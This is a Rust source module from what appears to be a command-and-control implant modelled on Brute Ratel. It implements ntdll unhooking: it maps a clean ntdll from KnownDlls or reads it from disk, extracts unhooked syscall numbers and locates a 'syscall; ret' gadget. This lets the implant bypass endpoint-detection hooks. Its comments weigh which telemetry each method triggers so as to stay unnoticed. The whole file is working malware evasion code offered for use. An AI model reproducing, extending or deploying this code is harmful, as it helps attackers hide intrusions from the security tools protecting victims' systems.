//! NTDLL fresh-map unhook (BRC4/s12-style).
//!
//! EDRs inline-hook the first bytes of Nt* syscall stubs in the loaded ntdll
//! (overwriting the `mov eax, SSN` / `syscall` prologue with a JMP into their
//! user-mode DLL). To recover pristine SSNs + a clean `syscall; ret` gadget we
//! map a FRESH copy of ntdll from the kernel-maintained
//! `\KnownDlls\ntdll` object directory (note: **no `.dll`** in the object name)
//! and read SSN bytes + scan the gadget over THAT.
//!
//! The hooked in-process ntdll is kept as the source of export NAME → RVA
//! mapping (inline hooks patch stub *bytes*, never the export directory —
//! names/ordinals/RVAs are intact). See the `FreshTextSource` impl below.
//!
//! # Chicken-and-egg (honest)
//!
//! `NtOpenSection` / `NtMapViewOfSection` are themselves ntdll exports. We
//! resolve them via the PEB walk over the *hooked* in-process ntdll. This is
//! acceptable: EDRs inline-hook the sensitive syscall stubs
//! (`NtAllocateVirtualMemory`, `NtWriteVirtualMemory`, …), NOT the
//! section-mapping primitives (which the loader calls constantly and are
//! low-value to hook). Even if hooked, the user-mode trampoline still issues
//! the real syscall, so the call succeeds.
//!
//! # IOC (honest)
//!
//! Mapping `\KnownDlls\ntdll` is a known EDR signature (ETW-TI logs
//! `NtMapViewOfSection` of SEC_IMAGE ntdll from a non-loader process). We map
//! once at bootstrap, build the SSN table, then unmap immediately (RAII guard)
//! so the second mapping is transient. The steady-state beacon never touches
//! it. This matches the BRC4 behaviour the roadmap targets.
//!
//! # Disk fallback (`fresh_ntdll_text_disk`)
//!
//! Some hosts (the P2 dev host among them) DENY `\KnownDlls\ntdll` even at
//! minimum access — system ACL or section parse fails and `fresh_ntdll_text`
//! returns `None`. Rather than give up the pristine copy (and accept the
//! hooked-only SSN resolution), we fall back to reading a pristine ntdll from
//! disk: `%SystemRoot%\System32\ntdll.dll`. The disk copy is byte-identical to
//! the on-disk source the loader mapped at process start (EDRs that patch
//! ntdll patch the *mapped* image, not the file), so it gives us clean stub
//! bytes + a clean `syscall; ret` gadget.
//!
//! IOC trade-off (honest): reading `System32\ntdll.dll` from a non-loader
//! process is a *different*, weaker signal than `NtMapViewOfSection` of
//! `SEC_IMAGE` ntdll — it goes through the normal kernel32 `CreateFileW`/
//! `ReadFile` path (no section object, no ETW-TI section-map telemetry). The
//! chain tries the least-suspicious source first; the disk path only fires
//! when KnownDlls is unavailable. Like the SEC_IMAGE path it runs once at
//! bootstrap and the buffer is dropped after — the steady-state beacon never
//! touches it.

#![cfg(target_os = "windows")]

use crate::heap::{String, Vec};
use core::ffi::c_void;

// ---- NT constants ----

/// SECTION_QUERY | SECTION_MAP_READ — the minimum access the KnownDlls system
/// ACL grants. SECTION_ALL_ACCESS (0x001F001F) is regularly DENIED even to
/// medium-IL processes and would make the map spuriously fail.
const SECTION_MIN_ACCESS: u32 = 0x1 | 0x4; // 0x5
const PAGE_READONLY: u32 = 0x02;
/// SECTION_INHERIT::ViewUnmap — do not inherit the view into child processes.
const VIEW_UNMAP: u32 = 2;
/// NtCurrentProcess() == (HANDLE)-1. Same idiom as ntalloc.rs.
const NT_CURRENT_PROCESS: *mut c_void = (-1isize) as *mut c_void;

/// `IMAGE_SCN_MEM_EXECUTE` — a code section. Used to find `.text`.
const IMAGE_SCN_MEM_EXECUTE: u32 = 0x2000_0000;

// ---- NT FFI structs (phnt/ntddk prototypes; ZeroBits is BY VALUE — H5 lesson) ----

/// Win32 UNICODE_STRING with a writable buffer (resolve.rs:322 has a `*const`
/// variant for the PEB's read-only name fields; here we construct the path).
#[repr(C)]
struct UnicodeStringMut {
    length: u16,         // bytes, not chars (no NUL counted)
    maximum_length: u16, // bytes
    buffer: *mut u16,
}

#[repr(C)]
struct ObjectAttributes {
    length: u32,
    root_directory: *mut c_void,
    object_name: *mut UnicodeStringMut,
    attributes: u32,
    security_descriptor: *mut c_void,
    security_quality_of_service: *mut c_void,
}

impl ObjectAttributes {
    const fn sizeof() -> u32 {
        core::mem::size_of::<Self>() as u32
    }
}

type NtOpenSection = unsafe extern "system" fn(
    *mut *mut c_void, // SectionHandle (out, by ref)
    u32,              // DesiredAccess (by value)
    *mut ObjectAttributes,
) -> i32;

// NtMapViewOfSection: ZeroBits (param 4) and CommitSize (param 5) are BY VALUE
// (ULONG_PTR / SIZE_T) — the same lesson as NtAllocateVirtualMemory in
// ntalloc.rs:21-30. Passing `&mut` here would put a stack address in the
// ZeroBits register and the kernel rejects it (ZeroBits ≤ 21 for user mode).
type NtMapViewOfSection = unsafe extern "system" fn(
    *mut c_void,      // SectionHandle (by value)
    *mut c_void,      // ProcessHandle (by value, NtCurrentProcess)
    *mut *mut c_void, // BaseAddress IN/OUT (by ref, init NULL)
    usize,            // ZeroBits (BY VALUE)
    usize,            // CommitSize (BY VALUE)
    *mut u64,         // SectionOffset IN/OUT (by ref, init 0)
    *mut usize,       // ViewSize IN/OUT (by ref, init 0 = whole)
    u32,              // InheritDisposition (by value, VIEW_UNMAP=2)
    u32,              // AllocationType (by value, 0)
    u32,              // Win32Protect (by value, PAGE_READONLY)
) -> i32;

type NtUnmapViewOfSection = unsafe extern "system" fn(*mut c_void, *mut c_void) -> i32;

// ---- Win32 file-API constants + FFI (disk fallback) ----

/// `GENERIC_READ` (bit 31). The only access we need to read ntdll off disk.
const GENERIC_READ: u32 = 0x8000_0000;
/// `FILE_SHARE_READ | FILE_SHARE_DELETE` (0x1 | 0x4). Sharing read+delete so we
/// don't contend with another reader or a rename/replace; NOT write-share, so a
/// concurrent writer (e.g. an updater) would block us rather than corrupt reads.
const FILE_SHARE_READ_DELETE: u32 = 0x1 | 0x4;
/// `OPEN_EXISTING` (3) — fail if the file isn't present (never create).
const OPEN_EXISTING: u32 = 3;
/// `INVALID_HANDLE_VALUE` ((HANDLE)-1) — the sentinel CreateFileW returns on
/// failure (Win32 uses this rather than NULL).
const INVALID_HANDLE_VALUE: *mut c_void = (-1isize) as *mut c_void;

/// Cap the bytes we'll ever read off disk for "ntdll.dll". Real ntdll on
/// Win10/11/Server is ~1.7-1.9 MiB; 4 MiB is a generous ceiling that rejects a
/// hostile/inflated file without truncating a legitimate one. Defense-in-depth
/// against a server-influenced ReadFile size; we cap *and* bound-check.
const NTDLL_FILE_CAP: usize = 4 * 1024 * 1024;

type CreateFileW = unsafe extern "system" fn(
    *const u16,    // lpFileName (wide, NUL-terminated)
    u32,           // dwDesiredAccess
    u32,           // dwShareMode
    *const c_void, // lpSecurityAttributes (NULL)
    u32,           // dwCreationDisposition
    u32,           // dwFlagsAndAttributes (0 for files; FILE_ATTRIBUTE_NORMAL=0x80 also ok)
    *const c_void, // hTemplateFile (NULL)
) -> *mut c_void;

type ReadFile = unsafe extern "system" fn(
    *mut c_void,   // hFile
    *mut u8,       // lpBuffer
    u32,           // nNumberOfBytesToRead
    *mut u32,      // lpNumberOfBytesRead (out)
    *const c_void, // lpOverlapped (NULL → synchronous)
) -> i32; // BOOL

type CloseHandle = unsafe extern "system" fn(*mut c_void) -> i32;

/// `GetSystemDirectoryW`: writes the system directory as wide chars into the
/// supplied buffer, returns the length (in chars, excluding NUL). Used so the
/// disk path follows a non-`C:` Windows install.
type GetSystemDirectoryW = unsafe extern "system" fn(*mut u16, u32) -> u32;

// ---- Raw-PE section descriptors (disk path; not the SEC_IMAGE .text parse) ----

/// Read a little-endian `u16` at `o` from `b`. `None` if out of bounds. No
/// panic — required under `panic = abort` (a malformed/truncated file must
/// return `None`, never abort the implant). Mirrors `pe/src/lib.rs::u16le`.
fn u16le(b: &[u8], o: usize) -> Option<u16> {
    let s = b.get(o..o + 2)?;
    Some(u16::from_le_bytes([s[0], s[1]]))
}

/// Read a little-endian `u32` at `o` from `b`. `None` if out of bounds. No
/// panic (see [`u16le`]). Mirrors `pe/src/lib.rs::u32le`. Used for DOS/PE
/// header fields (`e_lfanew`, section RVAs/sizes/raw pointers).
fn u32le(b: &[u8], o: usize) -> Option<u32> {
    let s = b.get(o..o + 4)?;
    Some(u32::from_le_bytes([s[0], s[1], s[2], s[3]]))
}

/// A PE section as parsed from a raw on-disk image: its RVA, size, AND its file
/// offset (`PointerToRawData`). The SEC_IMAGE `parse_text_section` only needs the
/// RVA+size (in a mapped image RVA == offset); the disk path needs the raw
/// pointer to translate RVAs to file offsets.
/// `#[derive(Copy)]` so `.iter().copied().find(...)` works in
/// `fresh_ntdll_text_disk` (the section list is small; iterating by value is
/// cheaper than borrowing through `.iter().find()` + `&&s`).
#[derive(Clone, Copy)]
#[repr(C)]
struct RawSection {
    virtual_address: u32,
    virtual_size: u32,
    raw_ptr: u32,
}

/// Map a pristine copy of ntdll from `\KnownDlls\ntdll` and locate its `.text`.
///
/// Returns `(fresh_base, text_rva, text_size)` on success. The caller owns the
/// mapping — call [`unmap_fresh`] when done (after the SSN table is built).
/// Returns `None` if KnownDlls can't be opened (ACL, low IL) or `.text` can't
/// be parsed — the caller falls back to the hooked ntdll.
///
/// # Safety
/// Resolves NtOpenSection/NtMapViewOfSection from the (hooked) in-process
/// ntdll via the PEB walk. See module docs on the chicken-and-egg trade-off.
pub unsafe fn fresh_ntdll_text() -> Option<(*mut u8, u32, u32)> {
    let open = crate::resolve::export_addr(b"ntdll.dll", b"NtOpenSection")?;
    let map = crate::resolve::export_addr(b"ntdll.dll", b"NtMapViewOfSection")?;
    let open: NtOpenSection = core::mem::transmute(open);
    let map: NtMapViewOfSection = core::mem::transmute(map);

    // Build "\KnownDlls\ntdll" as UTF-16 on the stack. NO ".dll" — the
    // KnownDlls object is named "ntdll", and "\KnownDlls\ntdll.dll" FAILS.
    // 16 chars + NUL = 17 wide = 32 bytes (length) / 34 bytes (max).
    let mut path: [u16; 17] = [
        b'\\' as u16,
        b'K' as u16,
        b'n' as u16,
        b'o' as u16,
        b'w' as u16,
        b'n' as u16,
        b'D' as u16,
        b'l' as u16,
        b'l' as u16,
        b's' as u16,
        b'\\' as u16,
        b'n' as u16,
        b't' as u16,
        b'd' as u16,
        b'l' as u16,
        b'l' as u16,
        0,
    ];
    let mut name = UnicodeStringMut {
        length: (16 * 2) as u16,         // 16 chars, no NUL counted
        maximum_length: (17 * 2) as u16, // room for NUL
        buffer: path.as_mut_ptr(),
    };
    let mut oa = ObjectAttributes {
        length: ObjectAttributes::sizeof(),
        root_directory: core::ptr::null_mut(),
        object_name: &mut name,
        attributes: 0,
        security_descriptor: core::ptr::null_mut(),
        security_quality_of_service: core::ptr::null_mut(),
    };

    // NtOpenSection -> section handle.
    let mut section: *mut c_void = core::ptr::null_mut();
    let st = open(&mut section, SECTION_MIN_ACCESS, &mut oa);
    if st < 0 || section.is_null() {
        return None;
    }

    // NtMapViewOfSection, PAGE_READONLY, ViewSize=0 (whole image).
    let mut base: *mut c_void = core::ptr::null_mut();
    let mut view_size: usize = 0;
    let mut section_offset: u64 = 0;
    let st = map(
        section,
        NT_CURRENT_PROCESS,
        &mut base,
        0, // ZeroBits BY VALUE
        0, // CommitSize BY VALUE
        &mut section_offset,
        &mut view_size,
        VIEW_UNMAP,
        0,
        PAGE_READONLY,
    );
    if st < 0 || base.is_null() {
        return None;
    }

    let fresh = base as *mut u8;
    match parse_text_section(fresh) {
        Some((rva, size)) => Some((fresh, rva, size)),
        None => {
            unmap_fresh(fresh);
            None
        }
    }
}

/// Unmap the fresh ntdll view. Safe to call with the base from
/// [`fresh_ntdll_text`]. No-op if NtUnmapViewOfSection can't be resolved.
///
/// # Safety
/// `base` must be a BaseAddress previously returned by NtMapViewOfSection and
/// not already unmapped.
pub unsafe fn unmap_fresh(base: *mut u8) {
    if let Some(addr) = crate::resolve::export_addr(b"ntdll.dll", b"NtUnmapViewOfSection") {
        let unmap: NtUnmapViewOfSection = core::mem::transmute(addr);
        unmap(NT_CURRENT_PROCESS, base as *mut c_void);
    }
}

// ===========================================================================
// Disk fallback: pristine ntdll from %SystemRoot%\System32\ntdll.dll
// ===========================================================================
//
// Used ONLY when `fresh_ntdll_text()` (KnownDlls SEC_IMAGE map) returns None.
// EDRs that patch ntdll patch the *mapped* image, never the on-disk file, so a
// disk read gives clean stub bytes + a clean `syscall; ret` gadget at the cost
// of a disk-read IOC (no section-map IOC — see module docs).
//
// Key difference from the SEC_IMAGE path: a raw on-disk PE is NOT section-
// mapped, so `.text` RVA (e.g. 0x1000) != file offset (e.g. 0x600). Every read
// goes through RVA→file-offset translation (see `rva_to_file_offset`).

/// A pristine ntdll read from disk, owned by a heap `Vec<u8>`. Unlike the
/// SEC_IMAGE mapping this needs NO `unmap_*`/RAII — the `Vec` drops itself.
///
/// Built by [`fresh_ntdll_text_disk`]; consumed via [`DiskTextSource`].
pub struct DiskTextHandle {
    /// The full raw PE file bytes (`MZ ...`).
    buf: Vec<u8>,
    /// Section table (rva/size/raw-ptr) parsed from `buf`.
    sections: Vec<RawSection>,
    /// `.text` (rva, size) — the first executable section.
    text_rva: u32,
    text_size: u32,
}

impl DiskTextHandle {
    /// `.text` (rva, size). `scan_syscall_gadget_range` takes these by value;
    /// the SSN resolver reads stub bytes through [`DiskTextSource`].
    pub fn text_bounds(&self) -> (u32, u32) {
        (self.text_rva, self.text_size)
    }
}

/// Read `%SystemRoot%\System32\ntdll.dll` off disk into a heap buffer and
/// return a handle to its pristine bytes. `None` if the file can't be opened /
/// read / parsed as a PE.
///
/// Path is resolved via `kernel32!GetSystemDirectoryW` (follows a non-`C:`
/// Windows install), then `<dir>\ntdll.dll`. File I/O is plain
/// `CreateFileW`/`ReadFile`/`CloseHandle` — deliberately NOT a section map, so
/// the IOC differs from the KnownDlls path (see module docs).
///
/// # Safety
/// Resolves four kernel32 exports via the PEB walk (same chicken-and-egg as
/// `fresh_ntdll_text` — kernel32 is always loaded, and these are low-value hook
/// targets). All PE-header offsets derived from `buf` are bounds-checked.
pub unsafe fn fresh_ntdll_text_disk() -> Option<DiskTextHandle> {
    let buf = read_ntdll_file()?;
    let sections = parse_sections_raw(&buf)?;
    // `.text` = first section with IMAGE_SCN_MEM_EXECUTE (0x2000_0000).
    let (text_rva, text_size) = sections
        .iter()
        .copied()
        .find(|s| {
            // Re-read Characteristics from the buffer (RawSection caches only the
            // three fields the disk read needs; the exec bit gates `.text` here).
            let raw = section_characteristics(&buf, s).unwrap_or(0);
            raw & IMAGE_SCN_MEM_EXECUTE != 0 && s.virtual_address != 0 && s.virtual_size >= 0x1000
        })
        .map(|s| (s.virtual_address, s.virtual_size))?;
    Some(DiskTextHandle {
        buf,
        sections,
        text_rva,
        text_size,
    })
}

/// Read `%SystemRoot%\System32\ntdll.dll` synchronously into a heap `Vec<u8>`.
/// Returns `None` on any Win32 failure or if the file exceeds
/// [`NTDLL_FILE_CAP`].
///
/// # Safety
/// Resolves `GetSystemDirectoryW`/`CreateFileW`/`ReadFile`/`CloseHandle` from
/// kernel32 via the PEB walk.
unsafe fn read_ntdll_file() -> Option<Vec<u8>> {
    let gsdw = crate::resolve::export_addr(b"kernel32.dll", b"GetSystemDirectoryW")?;
    let create = crate::resolve::export_addr(b"kernel32.dll", b"CreateFileW")?;
    let read = crate::resolve::export_addr(b"kernel32.dll", b"ReadFile")?;
    let close = crate::resolve::export_addr(b"kernel32.dll", b"CloseHandle")?;
    let gsdw: GetSystemDirectoryW = core::mem::transmute(gsdw);
    let create: CreateFileW = core::mem::transmute(create);
    let read: ReadFile = core::mem::transmute(read);
    let close: CloseHandle = core::mem::transmute(close);

    // 1. System directory (wide). GetSystemDirectoryW returns the required
    //    length (chars, excl. NUL); if it exceeds our 260-char buffer, give up.
    let mut sysdir: [u16; 260] = [0; 260];
    let n = gsdw(sysdir.as_mut_ptr(), sysdir.len() as u32);
    if n == 0 || n as usize >= sysdir.len() {
        return None;
    }

    // 2. Append "\\ntdll.dll\0". Total must fit in 260 (MAX_PATH-class).
    let suffix: &[u16] = &[
        b'\\' as u16,
        b'n' as u16,
        b't' as u16,
        b'd' as u16,
        b'l' as u16,
        b'l' as u16,
        b'.' as u16,
        b'd' as u16,
        b'l' as u16,
        b'l' as u16,
        0,
    ];
    if (n as usize) + suffix.len() > sysdir.len() {
        return None;
    }
    for (i, &c) in suffix.iter().enumerate() {
        sysdir[n as usize + i] = c;
    }

    // 3. CreateFileW (GENERIC_READ, share read+delete, OPEN_EXISTING).
    let h = create(
        sysdir.as_ptr(),
        GENERIC_READ,
        FILE_SHARE_READ_DELETE,
        core::ptr::null(),
        OPEN_EXISTING,
        0,
        core::ptr::null(),
    );
    if h.is_null() || h == INVALID_HANDLE_VALUE {
        return None;
    }

    // 4. ReadFile loop into a growing Vec until EOF (read==0) or the cap.
    //    `cap_chunk` defends the per-read nNumberOfBytesToRead (u32): never ask
    //    for more than u32::MAX, and keep the cumulative buffer under the cap.
    let mut out: Vec<u8> = Vec::new();
    let mut chunk = [0u8; 0x4000]; // 16 KiB stack read buffer
    loop {
        if out.len() >= NTDLL_FILE_CAP {
            break;
        }
        let want = core::cmp::min(chunk.len(), NTDLL_FILE_CAP - out.len()) as u32;
        let mut got: u32 = 0;
        let ok = read(h, chunk.as_mut_ptr(), want, &mut got, core::ptr::null());
        if ok == 0 {
            // ReadFile error — bail; CloseHandle below still runs.
            close(h);
            return None;
        }
        if got == 0 {
            break; // EOF
        }
        out.extend_from_slice(&chunk[..got as usize]);
    }
    close(h);

    if out.len() > NTDLL_FILE_CAP {
        return None;
    }
    Some(out)
}

/// Parse a raw on-disk PE's section table. Bounds-checked everywhere (a
/// malformed/truncated file returns `None`, never panics — panic=abort in this
/// crate). Captures `PointerToRawData` (the file offset the disk path needs).
unsafe fn parse_sections_raw(image: &[u8]) -> Option<Vec<RawSection>> {
    // DOS header: MZ + e_lfanew @ 0x3C.
    let m0 = *image.get(0)?;
    let m1 = *image.get(1)?;
    if m0 != b'M' || m1 != b'Z' {
        return None;
    }
    let e_lfanew = u32le(image, 0x3C)? as usize;
    // PE signature "PE\0\0".
    if *image.get(e_lfanew)? != b'P' || *image.get(e_lfanew + 1)? != b'E' {
        return None;
    }
    let nt = e_lfanew;
    // IMAGE_FILE_HEADER at nt+4: NumberOfSections @ +2 (u16), SizeOfOptionalHeader @ +16 (u16).
    let n_sec = u16le(image, nt + 4 + 2)? as usize;
    let opt_size = u16le(image, nt + 4 + 16)? as usize;
    let sec_table = nt.checked_add(4)?.checked_add(20)?.checked_add(opt_size)?;
    // A pathological n_sec makes the loop pointless; clamp to a sane count
    // (ntdll has ~10 sections; 96 is a generous ceiling, 40-byte headers fit in
    // 4 KiB).
    if n_sec > 96 {
        return None;
    }
    let mut out = Vec::with_capacity(n_sec);
    for i in 0..n_sec {
        let so = sec_table.checked_add(i.checked_mul(40)?)?;
        // IMAGE_SECTION_HEADER: VirtualSize @ +8, VirtualAddress @ +12,
        // PointerToRawData @ +20.
        let vs = u32le(image, so + 8)?;
        let va = u32le(image, so + 12)?;
        let rp = u32le(image, so + 20)?;
        out.push(RawSection {
            virtual_address: va,
            virtual_size: vs,
            raw_ptr: rp,
        });
    }
    Some(out)
}

/// Translate an RVA into a file offset using the section table. Walks sections;
/// the one whose `[virtual_address, virtual_address+virtual_size)` contains
/// `rva` contributes `raw_ptr + (rva - virtual_address)`. `None` if no section
/// matches (RVA outside any mapped section).
fn rva_to_file_offset(sections: &[RawSection], rva: u32) -> Option<usize> {
    for s in sections {
        let va = s.virtual_address;
        // Treat a 0 virtual_size as "covers up to u32::MAX" defensively (real
        // sections always set it; matches the pe crate's convention).
        let vsize = if s.virtual_size != 0 {
            s.virtual_size
        } else {
            u32::MAX
        };
        if rva >= va && rva.checked_sub(va)? < vsize {
            let off = s.raw_ptr.checked_add(rva - va)? as usize;
            return Some(off);
        }
    }
    None
}

/// Re-read a section's `Characteristics` (the exec bit) from the raw image,
/// located by recomputing the section-header offset from the cached RawSection.
/// The exec bit isn't cached in `RawSection` (only the three disk-read fields
/// are); we re-read it here to gate the `.text` selection in
/// `fresh_ntdll_text_disk`.
unsafe fn section_characteristics(image: &[u8], s: &RawSection) -> Option<u32> {
    // To find the header we'd need its index; cheaper: we already know VA/size,
    // so re-scan the table for the matching VA and read Characteristics @ +36.
    let e_lfanew = u32le(image, 0x3C)? as usize;
    let n_sec = u16le(image, e_lfanew + 4 + 2)? as usize;
    let opt_size = u16le(image, e_lfanew + 4 + 16)? as usize;
    let sec_table = e_lfanew
        .checked_add(4)?
        .checked_add(20)?
        .checked_add(opt_size)?;
    for i in 0..n_sec {
        let so = sec_table.checked_add(i.checked_mul(40)?)?;
        let va = u32le(image, so + 12)?;
        if va == s.virtual_address {
            return u32le(image, so + 36);
        }
    }
    None
}

/// A `SyscallSource` backed by the **disk** pristine ntdll (`DiskTextHandle`'s
/// `Vec<u8>`). `read(rva, len)` translates RVA→file-offset then slices the
/// buffer — the key difference from `FreshTextSource`, which does
/// `fresh_base.add(rva)` (SEC_IMAGE: RVA == offset).
///
/// Export (name, rva) pairs still come from the HOOKED in-process ntdll (names
/// are hook-proof) — passed in by the caller (Runtime::init already
/// materializes them for the KnownDlls arm).
pub struct DiskTextSource<'a> {
    handle: &'a DiskTextHandle,
    exports: &'a [(String, u32)],
}

impl<'a> DiskTextSource<'a> {
    pub fn new(handle: &'a DiskTextHandle, exports: &'a [(String, u32)]) -> Self {
        Self { handle, exports }
    }
}

impl<'a> nyx_evasion::SyscallSource for DiskTextSource<'a> {
    fn read(&self, rva: u32, len: usize) -> Vec<u8> {
        let buf = &self.handle.buf;
        match rva_to_file_offset(&self.handle.sections, rva) {
            Some(off) => {
                // Bounds-checked slice: never read past the buffer end.
                let end = off.checked_add(len).unwrap_or(buf.len()).min(buf.len());
                if off <= end {
                    buf[off..end].to_vec()
                } else {
                    Vec::new()
                }
            }
            None => Vec::new(),
        }
    }
    fn exports(&self) -> &[(String, u32)] {
        self.exports
    }
}

/// Parse the mapped PE (SEC_IMAGE: RVAs are direct offsets from `base`) and
/// return `(rva, size)` of the first executable section (`.text`).
///
/// Walks: e_lfanew → NT headers → section table → first section with
/// `Characteristics & IMAGE_SCN_MEM_EXECUTE`. Mirrors the PE-header parse in
/// resolve.rs but for the fresh image.
unsafe fn parse_text_section(base: *mut u8) -> Option<(u32, u32)> {
    // e_lfanew at offset 0x3C (DOS header). Validate MZ first.
    if *base != b'M' || *base.add(1) != b'Z' {
        return None;
    }
    let e_lfanew = *(base.add(0x3C) as *const i32) as usize;
    // Bounds-check the PE signature read.
    if e_lfanew.checked_add(24)? > isize::MAX as usize {
        return None;
    }
    let nt = base.add(e_lfanew);
    // "PE\0\0"
    if *nt != b'P' || *nt.add(1) != b'E' {
        return None;
    }
    // IMAGE_FILE_HEADER at nt+4: NumberOfSections @ +2 (u16), SizeOfOptionalHeader @ +16 (u16).
    let n_sec = *(nt.add(4 + 2) as *const u16) as usize;
    let opt_size = *(nt.add(4 + 16) as *const u16) as usize;
    let sec_table = nt.add(4 + 20 + opt_size);
    // Each IMAGE_SECTION_HEADER is 40 bytes. VirtualSize @ +8, VirtualAddress @ +12,
    // Characteristics @ +36.
    for i in 0..n_sec {
        let sh = sec_table.add(i * 40);
        let characteristics = *(sh.add(36) as *const u32);
        if characteristics & IMAGE_SCN_MEM_EXECUTE != 0 {
            let virt_size = *(sh.add(8) as *const u32);
            let virt_addr = *(sh.add(12) as *const u32);
            // Sanity: a real .text is at least a page and within user space.
            if virt_addr != 0 && virt_size >= 0x1000 {
                return Some((virt_addr, virt_size));
            }
        }
    }
    None
}

/// Scan `[base + text_rva, base + text_rva + text_size)` for the first
/// `syscall; ret` (`0F 05 C3`) gadget and return its absolute address.
///
/// Replaces the hardcoded `0x1000..0x10000` window in
/// `syscalls.rs::scan_syscall_gadget` with the REAL .text bounds parsed from
/// the fresh image.
///
/// # Safety
/// `base` + `[text_rva, text_rva+text_size)` must be a valid mapped range.
pub unsafe fn scan_syscall_gadget_range(
    base: *mut u8,
    text_rva: u32,
    text_size: u32,
) -> Option<u64> {
    let start = text_rva as usize;
    let len = text_size as usize;
    if len < 3 {
        return None;
    }
    let blob = core::slice::from_raw_parts(base.add(start), len);
    for i in 0..len - 2 {
        if blob[i] == 0x0F && blob[i + 1] == 0x05 && blob[i + 2] == 0xC3 {
            return Some(base as u64 + start as u64 + i as u64);
        }
    }
    None
}

/// A `SyscallSource` whose export (name, rva) pairs come from the HOOKED
/// in-process ntdll (names are intact — inline hooks patch stub bytes, not the
/// export directory) but whose `read()` reads from the FRESH base (pristine
/// stub prologues). This is the bridge that lets `nyx_evasion::resolve_table`
/// run over clean SSN bytes while using the hooked image's export list.
pub struct FreshTextSource<'a> {
    /// Pristine ntdll base (from `fresh_ntdll_text`).
    pub fresh_base: *mut u8,
    /// (name, rva) from the hooked ntdll — borrowed for the resolve call.
    pub exports: &'a [(String, u32)],
}

impl<'a> nyx_evasion::SyscallSource for FreshTextSource<'a> {
    fn read(&self, rva: u32, len: usize) -> Vec<u8> {
        unsafe {
            let ptr = self.fresh_base.add(rva as usize);
            core::slice::from_raw_parts(ptr, len).to_vec()
        }
    }
    fn exports(&self) -> &[(String, u32)] {
        self.exports
    }
}

/// Count the bytes that DIFFER between the fresh `.text` and the in-process
/// (hooked) ntdll `.text` at the same RVAs. Used by the selftest Phase-0 to
/// quantify how hooked the host is (0 = unhooked, >0 = was hooked).
///
/// # Safety
/// Both `fresh_base` and `hooked_base` + `[text_rva, text_rva+text_size)`
/// must be valid readable ranges.
pub unsafe fn text_diff_count(
    fresh_base: *mut u8,
    hooked_base: *mut u8,
    text_rva: u32,
    text_size: u32,
) -> usize {
    let len = text_size as usize;
    if len == 0 {
        return 0;
    }
    let fresh = core::slice::from_raw_parts(fresh_base.add(text_rva as usize), len);
    let hooked = core::slice::from_raw_parts(hooked_base.add(text_rva as usize), len);
    let mut diffs = 0usize;
    for i in 0..len {
        if fresh[i] != hooked[i] {
            diffs += 1;
        }
    }
    diffs
}
